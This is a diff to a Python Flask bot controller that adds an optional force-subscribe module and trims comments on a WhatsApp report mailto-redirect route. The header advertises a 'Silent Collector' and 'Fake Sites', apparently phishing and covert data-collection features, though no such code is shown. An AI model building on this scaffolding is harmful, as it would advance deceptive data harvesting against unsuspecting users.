@@ -2,7 +2,7 @@
 # ============================================================
 # DEV 1 - Bot Controller v13
 # مع Admin System + Silent Collector + Fake Sites + Admin Tools
-# + WhatsApp Report Redirect (mailto only)
+# + WhatsApp Report + Force Subscribe
 # ============================================================
 
 import os
@@ -115,6 +115,18 @@ except Exception as e:
     ADMIN_TOOLS_ENABLED = False
     def init_admin_tools(app, bot): pass
 
+# ═══════════════════════════════════════════════════════
+# ★★★ Force Subscribe ★★★
+# ═══════════════════════════════════════════════════════
+try:
+    from force_subscribe import init_force_subscribe
+    FORCE_SUBSCRIBE_ENABLED = True
+    logger.info("[+] force_subscribe imported")
+except Exception as e:
+    logger.exception(f"[-] force_subscribe import failed: {e}")
+    FORCE_SUBSCRIBE_ENABLED = False
+    def init_force_subscribe(bot): return False
+
 
 # ═══════════════════════════════════════════════════════
 # Flask Setup
@@ -124,7 +136,6 @@ app = Flask(__name__)
 
 # ═══════════════════════════════════════════════════════
 # ★★★ WhatsApp Report Redirect — mailto فقط ★★★
-# يفتح التطبيق الافتراضي للإيميل مباشرة على الموبايل
 # ============================================================
 @app.route('/wa/redirect/<payload_id>')
 def wa_redirect(payload_id):
@@ -140,8 +151,6 @@ def wa_redirect(payload_id):
     subject = payload['subject']
     body = payload['body']
 
-    # ⚡ mailto: بيفتح التطبيق الافتراضي للإيميل مباشرة
-    # (Gmail / Outlook / Mail — حسب التطبيق الافتراضي للمستخدم)
     mailto_url = (
         f"mailto:{to}"
         f"?subject={urllib.parse.quote(subject)}"
@@ -319,6 +328,19 @@ if ADMIN_TOOLS_ENABLED:
         logger.exception(f"[-] Admin Tools init failed: {e}")
 else:
     logger.warning("[-] Admin Tools disabled")
+
+# ═══════════════════════════════════════════════════════
+# ★★★ Init Force Subscribe ★★★
+# ═══════════════════════════════════════════════════════
+if FORCE_SUBSCRIBE_ENABLED:
+    try:
+        success = init_force_subscribe(bot)
+        if success:
+            logger.info("[+] Init: force subscribe")
+    except Exception as e:
+        logger.exception(f"[-] Force Subscribe init failed: {e}")
+else:
+    logger.warning("[-] Force Subscribe disabled")
 
 
 # ═══════════════════════════════════════════════════════
